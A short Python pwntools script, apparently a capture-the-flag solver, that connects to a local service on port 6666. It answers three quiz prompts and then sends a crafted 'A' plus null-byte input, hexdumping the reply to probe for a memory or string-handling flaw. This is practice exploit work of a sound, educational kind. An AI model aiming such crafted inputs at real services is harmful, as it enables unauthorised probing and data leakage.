#!/usr/bin/env python
# -=-<[ Bismillahirrahmanirrahim ]>-=-
# -*- coding: utf-8 -*-
# @Date    : 2022-02-20 15:16:44
# @Author  : Dahir Muhammad Dahir (dahirmuhammad3@gmail.com)
# @Link    : link
# @Version : 1.0.0


from pwn import *

conn = remote("localhost", 6666)
conn.sendline("arsenal")
conn.recvrepeat(timeout=2)
conn.sendline("gyeongbokgung")
conn.recvrepeat(timeout=2)
conn.sendline("psy")
conn.recvrepeat(timeout=2)
conn.sendline('A\x00')
print(hexdump(conn.recvrepeat()))
